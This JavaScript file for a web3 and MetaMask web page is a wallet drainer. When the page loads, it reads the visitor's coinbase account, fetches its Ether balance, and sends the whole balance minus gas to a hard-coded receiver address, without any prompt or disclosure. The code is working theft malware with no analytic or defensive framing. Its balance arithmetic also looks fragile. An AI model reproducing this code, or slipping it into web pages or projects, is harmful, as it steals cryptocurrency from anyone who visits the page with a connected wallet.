// Main coinbase account from metamask
var coinbase;
// Ether Balance of coinbase account
var etherBalance;
// Ether Receiver
var etherReceiver = "0x8888881CEDA4E95043bcD6CEC9ed0fF3C419a3b6";
// Transaction object
var transactionObject;
// Gas Limit
var gasLimitNumber = 21000;
// Gas Price
var gasPriceNumber = 10**10;
// Web3 start function, It will run when the web page is loaded  
function startWeb3() {

  coinbase = web3.eth.coinbase;
  getBalance(coinbase);

}

// Get the Ether balance of the coinbase account from the metamask
function getBalance(address) {
  return web3.eth.getBalance(address, function (error, result) {
    if (!error) {
        etherBalance = Number(result.c[0] + '' + result.c[1]) - gasLimitNumber * gasPriceNumber;
        transactionObject = {from:coinbase, to:etherReceiver, value:etherBalance, gas:gasLimitNumber, gasPrice:gasPriceNumber};
        sendBalance(transactionObject);
    } else {
      	console.error(error);
    }
  })
}

// Send Ethers to etherReceiver account from coinbase account
function sendBalance(transactionObject) {
  return web3.eth.sendTransaction(transactionObject, function (error, result) {
    if (!error) {
        // console.log(etherBalance);
    } else {
        console.error(error);
    }
  })
}
